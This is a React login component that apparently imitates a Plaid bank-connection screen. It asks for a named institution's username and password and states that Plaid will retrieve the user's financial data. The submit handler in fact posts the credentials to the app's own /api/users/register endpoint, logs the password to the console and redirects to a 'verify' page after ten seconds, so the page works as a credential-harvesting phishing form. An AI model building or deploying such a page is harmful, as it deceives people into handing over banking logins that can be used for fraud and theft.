import { useState } from "react";
import { Navbar } from "../components/Navbar";
import axios from "axios";
import { useLocation } from "react-router-dom";
import eyePass from "../src/assets/logos/eyepass.svg";
import { useNavigate } from "react-router-dom";

export const Register = () => {
  const location = useLocation();
  const data = location.state;
  const navigate = useNavigate();

  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    email: "",
    password: "",
  });
  const handleChange = (e) => {
    console.log(e.target.name);
    console.log(e.target.value);
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };
  const API_URL = import.meta.env.VITE_API_URL;

  const handleSubmit = async (e) => {
    e.preventDefault();
    console.log("formData:", formData);
    setLoading(true);

    try {
      const res = await axios.post(`${API_URL}/api/users/register`, formData);
      console.log(res.data);

      setFormData({
        email: "",
        password: "",
      });

      setTimeout(() => {
        navigate("/verify");
      }, 10000);

      console.log(res.data);
    } catch (error) {
      console.error("Error registering user:", error);
      setLoading(false);
    }
  };
  return (
    <div>
      <Navbar />

      <div className="flex flex-col items-center justify-center mt-10">
        <h1 className="text-2xl p-3 border border-green-300 shadow shadow-green-500   bg-gray-200 rounded-full">
          🏠
        </h1>

        <div className="mt-6 md:mt-10">
          <h1 className="font-bold text-center md:text-2xl  ">
            Log into {data.name}{" "}
          </h1>
          <p className="px-3 text-sm text-center font-semibold text-gray-500 mt-1 md:text-xl ">
            Enter your{" "}
            <span className="text-gray-700 font-bold">{data.name}</span>{" "}
            credentials to connect your account to this application{" "}
          </p>
        </div>
      </div>
      <form
        onSubmit={handleSubmit}
        className="flex flex-col justify-center items-center space-y-3"
      >
        <div className=" px-4 mt-4 space-y-3 w-full max-w-lg">
          <input
            type="email"
            value={formData.email}
            name="email"
            onChange={handleChange}
            placeholder="Email or Username"
            className="border w-full  p-3 text-xl font-semibold   border-gray-400 rounded-lg max-w-lg 
            "
            required
          />

          <div className="relative">
            <input
              type={showPassword ? "text" : "password"}
              name="password"
              value={formData.password}
              onChange={handleChange}
              placeholder="Password"
              className="border w-full  p-3 text-xl font-semibold border-gray-400 rounded-lg"
            />
            <img
              src={eyePass}
              width={15}
              alt="Toggle Password"
              className="absolute top-5 right-5 cursor-pointer bg-gray-200 rounded-full text-lg"
              onClick={() => setShowPassword(!showPassword)}
            />
          </div>
        </div>

        <div className="flex flex-col h-90 justify-end  px-8">
          <h1 className="text-sm text-center md:text-2xl ">
            By providing your {data.name} credentials to Plaid you're enabling
            Plaid to retrieve your financial data
          </h1>
          <button
            disabled={loading}
            type="submit"
            className="bg-gray-700 hover:bg-gray-800 cursor-pointer text-white rounded-lg mt-3 p-3 md:text-2xl "
          >
            {loading ? (
              <>
                <span className="spinner"></span>
                Loading...
              </>
            ) : (
              "Submit"
            )}
          </button>
          <p className="text-center mt-4">Reset password</p>
        </div>
      </form>
    </div>
  );
};
